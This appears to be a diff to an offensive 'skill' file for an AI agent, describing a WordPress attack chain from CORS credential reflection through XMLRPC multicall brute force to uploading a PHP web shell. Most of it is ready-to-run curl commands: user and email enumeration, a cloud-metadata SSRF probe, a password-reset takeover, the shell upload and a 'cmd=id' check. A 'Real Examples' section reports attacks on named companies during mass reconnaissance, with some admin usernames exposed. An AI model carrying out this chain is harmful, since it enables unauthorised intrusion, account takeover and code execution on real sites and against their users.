@@ -1,8 +1,11 @@
 ---
 name: wordpress-cors-xmlrpc-rce-chain
-description: "Proven attack chain combining CORS credential reflection on WordPress REST API with XMLRPC methods (system.multicall, wp.uploadFile) and open registration for full RCE. Built from field experience across 58-company mass recon where 5/7 deep targets had CORS credential reflection on WP REST API — including wines.com where the full chain was demonstrated end-to-end."
-sources: field_recon, mass_recon_wave1_7, mass_recon_wave2_5
-report_count: 6
+description: "Proven attack chain combining CORS credential reflection on WordPress REST API with XMLRPC methods (system.multicall, wp.uploadFile) and open registration for full RCE. Built from field experience across 58-company mass recon where 5/7 deep targets had CORS credential reflection on WP REST API — including ecommerce.example.com where the full chain was demonstrated end-to-end."
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [wordpress, cors, xmlrpc, rce, chain, redteam]
 ---
 
 # WordPress CORS → XMLRPC → RCE Attack Chain
@@ -29,7 +32,7 @@ CORS credential reflection (user list + CSRF tokens)
 Test the WP REST API for CORS credential reflection:
 
 ```bash
-curl -sk -I "https://$TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -iE "access-control"
+curl --max-time 30 --connect-timeout 10 -sk -I "https://$TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -iE "access-control"
 ```
 
 **Expected vulnerable response (BOTH headers must appear):**
@@ -55,10 +58,10 @@ fetch("https://TARGET/wp-json/wp/v2/users", {credentials:"include"})
 Yoast SEO author sitemaps expose admin slugs that decode to email addresses:
 
 ```bash
-curl -sk "https://$TARGET/author-sitemap.xml" | grep -oP 'author/[^<]+' | sort -u
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/author-sitemap.xml" | grep -Eo 'author/[^<]+' | sort -u
 
 # Decode slugs to emails
-curl -sk "https://$TARGET/author-sitemap.xml" | grep -oP 'author/[^<]+' | sed 's/author\///' |
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/author-sitemap.xml" | grep -Eo 'author/[^<]+' | sed 's/author\///' |
   python3 -c "
 import sys, re
 for slug in sys.stdin:
@@ -73,14 +76,14 @@ for slug in sys.stdin:
 ### Step 3 — Open Registration Check
 
 ```bash
-curl -sk "https://$TARGET/wp-login.php?action=register" | grep -iE "register|Registration"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-login.php?action=register" | grep -iE "register|Registration"
 # HTTP 200 with registration form AND no "Registration disabled" message = OPEN
 ```
 
 ### Step 4 — XMLRPC Method Enumeration
 
 ```bash
-curl -sk -X POST "https://$TARGET/xmlrpc.php" \
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://$TARGET/xmlrpc.php" \
   -H "Content-Type: text/xml" \
   -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' |
   python3 -c "
@@ -96,16 +99,16 @@ for m in found:
 
 ### Step 4a — IMDS SSRF via pingback.ping (WIP — Why It Fails)
 
-Testing IMDS (AWS metadata) SSRF via `pingback.ping` returns **faultCode 0** regardless of whether the SSRF succeeded. The problem: WordPress pingback only returns its own processing status, NOT the response body from the SSRF target. The HTTP request to 169.254.169.254 happens server-side but the response never reaches the attacker.
+Testing IMDS (AWS metadata) SSRF via `pingback.ping` returns **faultCode 0** regardless of whether the SSRF succeeded. The problem: WordPress pingback only returns its own processing status, NOT the response body from the SSRF target. The HTTP request to [REDACTED_IP] happens server-side but the response never reaches the attacker.
 
 ```bash
 # Test IMDS via pingback — faultCode 0 does NOT mean data returned
-curl -sk -X POST "https://$TARGET/xmlrpc.php" \
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://$TARGET/xmlrpc.php" \
   -H "Content-Type: text/xml" \
   -d '<?xml version="1.0"?>
 <methodCall><methodName>pingback.ping</methodName>
 <params>
-<param><value><string>http://169.254.169.254/latest/meta-data/</string></value></param>
+<param><value><string>http://[REDACTED_IP]/latest/meta-data/</string></value></param>
 <param><value><string>https://TARGET/some-post</string></value></param>
 </params></methodCall>'
 # faultCode 0 means "pingback processing completed" — NOT data retrieval
@@ -125,18 +128,18 @@ Staging environments commonly return HTTP 405 on GET `/xmlrpc.php` but **fully a
 
 ```bash
 # Staging XMLRPC — ALWAYS test via POST regardless of GET response
-curl -sk -X POST "https://staging.$TARGET/xmlrpc.php" \
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://staging.$TARGET/xmlrpc.php" \
   -H "Content-Type: text/xml" \
   -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
-# staging.biglots.com: GET → 405, POST with XML → 80+ methods with system.multicall
+# staging.retail.example.com: GET → 405, POST with XML → 80+ methods with system.multicall
 ```
 
 Also check for WordPress install pages on staging — these can be a foothold vector:
 ```bash
 # Check for exposed install pages on staging
-curl -sk -o /dev/null -w "%{http_code}" "https://staging.$TARGET/wp-admin/install.php"
-curl -sk -o /dev/null -w "%{http_code}" "https://staging.$TARGET/wp-admin/upgrade.php"
-curl -sk -o /dev/null -w "%{http_code}" "https://staging.$TARGET/wp-admin/setup-config.php"
+curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}" "https://staging.$TARGET/wp-admin/install.php"
+curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}" "https://staging.$TARGET/wp-admin/upgrade.php"
+curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}" "https://staging.$TARGET/wp-admin/setup-config.php"
 # HTTP 200 on install.php = potential reinstallation attack
 # HTTP 409 on setup-config.php = wp-config.php exists confirmation
 ```
@@ -149,7 +152,7 @@ WordPress 6.x+ registers new users as **SUBSCRIBER** by default. Subscribers CAN
 
 ```bash
 # Check user role BEFORE trying wp.uploadFile
-curl -sk -X POST "https://$TARGET/xmlrpc.php" \
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://$TARGET/xmlrpc.php" \
   -H "Content-Type: text/xml" \
   -d '<?xml version="1.0"?>
 <methodCall><methodName>wp.getProfile</methodName>
@@ -194,7 +197,7 @@ With admin usernames from Step 1 and emails from Step 2, brute force via multica
 Once valid credentials are found:
 
 ```bash
-curl -sk -X POST "https://$TARGET/xmlrpc.php" \
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://$TARGET/xmlrpc.php" \
   -H "Content-Type: text/xml" \
   -d '<?xml version="1.0"?>
 <methodCall><methodName>wp.uploadFile</methodName>
@@ -212,7 +215,7 @@ curl -sk -X POST "https://$TARGET/xmlrpc.php" \
 ### Step 7 — RCE Verification
 
 ```bash
-curl -sk "https://$TARGET/wp-content/uploads/2026/06/shell.php?cmd=id"
+curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-content/uploads/2026/06/shell.php?cmd=id"
 ```
 
 ## Attack Surface Signals
@@ -233,7 +236,7 @@ curl -sk "https://$TARGET/wp-content/uploads/2026/06/shell.php?cmd=id"
 
 ## Real Examples
 
-### Target: wines.com — Partial chain (subscriber blocked upload)
+### Target: ecommerce.example.com — Partial chain (subscriber blocked upload)
 
 1. CORS credential reflection on `/wp-json/wp/v2/users` — 11 users exposed including admins (jackie, randy-caparoso, admin)
 2. Yoast sitemap at `/author-sitemap.xml` — decoded emails from author slugs
@@ -244,7 +247,7 @@ curl -sk "https://$TARGET/wp-content/uploads/2026/06/shell.php?cmd=id"
 7. **Chain blocked at upload step** — needs admin escalation or plugin CVE
 8. **Workaround:** ElementsKit CVE-2023-6853 (v2.9.2 installed) handler exists but requires valid nonce
 
-### Target: patientportal.com — No WordPress (Flask/React SPA)
+### Target: health-saas.example.com — No WordPress (Flask/React SPA)
 
 Healthcare SaaS platform — no WordPress present to chain against. Demonstrates that CORS + open API is a different class of target requiring Firebase/Flask exploitation rather than WordPress.
 
@@ -280,14 +283,14 @@ s.post("https://$TARGET/wp-login.php?action=rp",
 
 **Pitfall:** The `rp_key` parameter is embedded in the email URL AND in the HTML form. Some WordPress versions auto-fill it, others require extracting it from the HTML form. Always extract from `r.text` using regex `name="rp_key"[^>]*value="([^"]+)"`.
 
-### Target: toolking.com — CORS + Slider Revolution RCE
+### Target:tools-retailer.com — CORS + Slider Revolution RCE
 
 1. CORS credential reflection — admin user exposed
 2. Slider Revolution plugin detected at `/wp-content/plugins/revslider/`
 3. CVE-2024-2534 (Revslider RCE) — authenticated exploit chain
 4. **Chain**: CORS admin session + plugin CVE → RCE
 
-### Target: seniorlifestyle.com — CORS Credential Reflection + XMLRPC 80 Methods (June 2026)
+### Target: senior-living-platform.com — CORS Credential Reflection + XMLRPC 80 Methods (June 2026)
 
 Senior living community website on nginx with full WordPress stack.
 
@@ -297,11 +300,35 @@ Senior living community website on nginx with full WordPress stack.
 4. **Attack surface**: CORS phishing + XMLRPC brute force amplification + SSRF via pingback + file upload if credentials obtained
 5. **Chain blocked at enumeration step** — REST users not enumerable without auth. Requires either: (a) authenticated admin visit to malicious page for CORS exfil, (b) brute force via system.multicall with known usernames, or (c) credential stuffing from prior breaches
 
-### Target: restonic.com — CORS + XMLRPC multicall
+### Target: mattress.example.com — CORS + XMLRPC multicall
 
 1. CORS credential reflection — REST API user + WooCommerce data exfiltratable
 2. XMLRPC with `system.multicall` — batch credential brute force possible
 3. **Chain**: CORS user list + multicall brute → valid creds → admin panel access
+
+## Verification
+
+1. **xmlrpc probe** — confirm xmlrpc.php detection:
+   ```bash
+   curl --max-time 30 --connect-timeout 10 -s -X POST "https://example.com/xmlrpc.php" -d "<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>" -o /dev/null -w "HTTP %{http_code}" 2>/dev/null && echo " (probe sent)"
+   ```
+2. **CORS + WP chain** — confirm chain components:
+   ```bash
+   grep -q "CORS\|xmlrpc\|RCE\|chain" SKILL.md && echo "PASS: chain components documented" || echo "FAIL"
+   ```
+All tests verify WP chain readiness.
+
+---
+
+## Pitfalls
+- **xmlrpc.php without exploitation chain** — xmlrpc is a feature. System.multicall for brute-force amplification is the finding, not xmlrpc itself.
+- **CORS on WP REST without credentials** — `Access-Control-Allow-Origin: *` is safe on anonymous endpoints. Need credentialed CORS for impact.
+- **Chain without demonstrated end-to-end** — having CORS + xmlrpc + upload doesn't automatically mean RCE. Demonstrate the full chain working end-to-end.
+- **WP-Cron RCE assumptions** — wp-cron executes scheduled tasks. Injecting into it is harder than it looks. Demonstrate actual code execution.
+- **Plugin-specific vs core WP** — vulnerabilities in third-party plugins have different severity than core WordPress vulnerabilities. Distinguish them.
+
+
+---
 
 ## Related Skills
 
